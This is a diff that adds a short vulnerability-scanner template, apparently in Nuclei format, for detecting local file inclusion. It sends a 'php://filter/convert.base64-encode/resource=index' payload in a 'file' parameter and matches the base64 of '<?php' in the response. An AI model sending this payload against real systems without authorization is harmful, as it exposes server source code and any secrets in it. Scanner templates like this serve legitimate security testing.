@@ -1,0 +1,20 @@
+id: lfi6-0276
+name: 'Traversal in file'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via file'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - 'php://filter/convert.base64-encode/resource=index'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
